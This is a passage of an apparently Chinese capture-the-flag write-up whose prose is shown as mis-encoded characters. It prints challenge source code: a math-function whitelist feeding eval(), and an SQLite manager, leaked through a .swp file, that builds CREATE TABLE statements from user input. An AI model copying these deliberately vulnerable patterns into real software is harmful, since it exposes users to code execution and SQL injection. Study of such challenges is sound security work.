'</span>tan<span class="token string">', '</span>tanh<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); $whitelist1 =['</span>expm1<span class="token string">', '</span>floor<span class="token string">', '</span>fmod<span class="token string">', '</span>acosh<span class="token string">', '</span>getrandmax<span class="token string">', '</span>asin<span class="token string">', '</span>asinh<span class="token string">', '</span>decoct<span class="token string">', '</span>atan2<span class="token string">', '</span>atan<span class="token string">', '</span>atanh<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); $whitelist1 =['</span>lcg_value<span class="token string">', '</span>min<span class="token string">', '</span>acos<span class="token string">','</span>log1p<span class="token string">', '</span>log<span class="token string">', '</span>max<span class="token string">', '</span>is_nan<span class="token string">', '</span>mt_srand<span class="token string">', '</span>octdec<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); $whitelist1= ['</span>bindec<span class="token string">', '</span>ceil<span class="token string">', '</span>hexdec<span class="token string">', '</span>hypot<span class="token string">','</span>mt_rand<span class="token string">','</span>exp<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); preg_match_all('</span><span class="token operator">/</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span><span class="token constant">Z_</span><span class="token punctuation">]</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span><span class="token constant">Z_0</span><span class="token number">-9</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token operator">/</span><span class="token string">', $content, $extractfunc); foreach ($extractfunc[0] as $ee) { if (!in_array($ee, $whitelist)) { die("æƒ³å•¥å‘¢= = $ee è¿™ä¸ªæ•°å­¦å‡½æ•°ä¸æ”¯æŒ"); } } $output=eval('</span><span class="token keyword">echo</span> <span class="token string">'.$content.'</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string">"string:"</span><span class="token punctuation">.</span>
<span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> "
"<span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<h3 id="SQLManager"><a href="#SQLManager" class="headerlink" title="SQLManager"></a>SQLManager</h3><p>é¡µé¢ç®€å•å®ç°äº†sqliteæ•°æ®åº“çš„ç®¡ç†ï¼Œå®ç°çš„åŠŸèƒ½åªæœ‰tableçš„åˆ›å»ºï¼Œå±•ç¤ºï¼Œrecordçš„æ’å…¥ã€‚</p>
<p>å­˜åœ¨æºç æ³„æ¼ï¼š</p>
<pre><code>view-source:http://eci-2zeiqyu2obvakg4ee0sx.cloudeci1.ichunqiu.com/.index.php.swp</code></pre><p>æ‹¿åˆ°æºç å¦‚ä¸‹ï¼š</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'util.php'</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">"Please build database first."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;> '"</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">"' LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"PRAGMA table_info(`{$tName}`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$cName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'modify'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'values'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `{$tName}` VALUES (?"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">',?'</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'build'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'Parameters missing.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$ccc</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.db'</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'è¡¨ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'è¡¨ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token number">10</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'remove'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM `{$tName}`;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_NUM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.4.1.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo<span class="token punctuation">=</span><span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>show.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>ä¿¡æ¯ <span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$message</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token delimiter">?></span> <span class="token punctuation">(</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>remove<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>åˆ è¡¨<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>modify<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($result); $i++) { ?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token markup">&lt; count($result[$i]); $j++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
